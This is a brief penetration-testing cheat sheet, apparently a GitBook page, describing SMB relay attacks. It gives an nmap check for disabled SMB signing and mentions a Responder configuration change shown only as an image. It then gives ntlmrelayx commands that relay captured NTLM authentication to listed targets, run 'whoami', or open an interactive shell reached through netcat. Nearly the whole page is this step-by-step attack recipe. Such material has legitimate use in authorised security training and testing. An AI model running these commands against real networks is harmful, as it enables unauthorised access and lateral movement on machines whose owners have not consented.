---
description: SMB SIGNING MUST BE OFF AND THE TARGET SHOULD BE A LOCAL/ADMIN
---

# SMB Relay Attacks(needs an event)

To check if target's SMB signing is OFF

```
nmap --script=smb2-security-mode.nse -p445 <ip>
```

First Change Responder Configuration( etc/responder/Responder.conf)

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Now the attack

```
impacket-ntlmrelayx
```

OR USE THIS OLD BUT NOT AS BROKEN

```
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

COLLECT THE HASHES (IF THE EVENT OCCURS WE GET A HASH)

```
ntlmrelayx.py -tf targets.txt -smb2support -i
```

for interactive mode

in the output if we see that we got a shell with an port number;USe netcat to connect to it using that port.

